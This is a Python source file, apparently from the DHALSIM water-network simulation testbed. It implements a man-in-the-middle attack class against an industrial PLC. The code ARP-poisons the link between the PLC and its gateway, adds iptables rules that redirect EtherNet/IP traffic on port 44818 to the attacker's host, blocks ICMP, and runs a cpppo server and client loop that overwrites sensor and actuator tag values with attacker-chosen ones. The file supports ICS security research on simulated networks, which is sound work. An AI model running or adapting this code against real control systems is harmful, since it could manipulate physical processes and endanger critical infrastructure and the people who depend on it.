import argparse
import os
import shlex
import socket
import subprocess
import threading
import time
from pathlib import Path
from typing import List

import fnfqueue

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from synced_attack import SyncedAttack


class MitmAttack(SyncedAttack):
    """
    This is a Man In The Middle attack class. This kind of attack will modify
    the data that is passed around in packages on the network, in order to
    change the values of tags before they reach the requesting PLC.

    A man in the middle attack always sits in between a PLC and its
    corresponding gateway.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.queue = fnfqueue.Connection()
        self.state = 0
        # self.q = None
        self.thread = None
        self.run_thread = False

    def setup(self):
        # Add the iptables rules
        # os.system('iptables -t nat -A POSTROUTING --destination 192.168.1.254 -j SNAT --to-source 192.168.1.1')
        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.1.1/24 -j SNAT --to-source 192.168.1.1')
        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.3.1/24 -j SNAT --to-source 192.168.1.1')
        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')


        cmd = shlex.split( '/usr/bin/python2 -m cpppo.server.enip --print --address ' +
                           self.attacker_ip + ':44818 T2:1=REAL V_ER2i:1=REAL')
        self.server = subprocess.Popen(cmd, shell=False)

        self.run_thread = True
        self.tags = {}
        self.thread = threading.Thread(target=self.cpppo_thread)
        self.thread.start()

        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])

    def receive_original_tags(self):
        target_ip = self.intermediate_plc['local_ip']
        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']

        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--address', str(target_ip) + ":44818"]

        for tag in request_tags:
            cmd.append(str(tag) + ':1')

        try:
            client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)

            # client.communicate is blocking
            raw_out = client.communicate()

            # Value is stored as first tuple element between a pair of square brackets
            values = []
            raw_string = raw_out[0]
            split_string = raw_string.split(b"\n")
            for word in split_string:
                values.append(word[(word.find(b'[') + 1):word.find(b']')])
            values.pop()

            for idx, value in enumerate(values):
                self.tags[request_tags[idx]] = value.decode()

        except Exception as error:
            print('ERROR enip _receive: ', error)

    def update_tags_dict(self):
        self.receive_original_tags()

        for tag in self.intermediate_attack['tags']:
            self.tags[tag['tag']] = tag['value']

    def make_client_cmd(self) -> List[str]:
        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
               str(self.intermediate_attack['local_ip'])]

        for tag in self.tags:
            cmd.append(str(tag) + ':1=' + str(self.tags[tag]))

        return cmd

    def cpppo_thread(self):
        while self.run_thread:
            self.update_tags_dict()
            cmd = self.make_client_cmd()

            print("MITM 💻:", "client:", cmd)
            try:
                client = subprocess.Popen(cmd, shell=False)
                client.wait()
            except Exception as error:
                print('ERROR enip _send multiple: ', error)
            self.receive_original_tags()
            time.sleep(0.05)

    def interrupt(self):
        if self.state == 1:
            self.teardown()

    def teardown(self):
        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])

        # Delete iptables rules
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        self.run_thread = False
        self.thread.join()

    def attack_step(self):
        if self.state == 0:
            if self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.state = 1
                self.setup()
        elif self.state == 1:

            if not self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.teardown()
                self.state = 2
        print("MITM 💻:", "state", self.state)


def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml", type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = MitmAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
